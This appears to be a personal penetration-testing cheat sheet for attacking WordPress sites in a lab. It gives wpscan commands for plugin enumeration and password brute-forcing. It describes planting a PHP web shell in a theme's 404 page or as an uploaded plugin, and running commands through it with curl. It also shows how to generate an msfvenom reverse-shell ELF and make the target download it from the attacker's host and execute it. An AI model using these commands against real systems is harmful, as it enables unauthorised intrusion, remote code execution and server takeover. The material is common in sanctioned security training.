# WordPress
------

Enumerate plugins faster
```bash
wpscan --url http://192.168.143.105/ --plugins-detection aggressive -e ap -t 50
```


Bruteforce using wpscan:
```bash
wpscan --url http://dc-2/ -U users -P wordlist
```


Uploading a php shell on  wordpress theme's 404 page and accessing the page:
```txt
/wp-content/themes/twentytwenty/404.php
```



If we have the option to upload plugins:

Get the plugin from `/opt/SecLists/Web-Shells/WordPress` , zip the plugin.

Upload the plugin and activate it via the admin console.

Use cURL to execute commands from the uploaded plugin:
```bash
curl "http://10.11.1.251/wp/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami"
```

Now we can generate a reverse shell payload as file type elf, upload it and execute it.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.133 LPORT=9999 -f elf > shell.elf
```

```bash
curl "http://10.11.1.251/wp/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.133:443/shell.elf

cmd=chmod%20%2Bx%20shell.elf

cmd=./shell.elf
```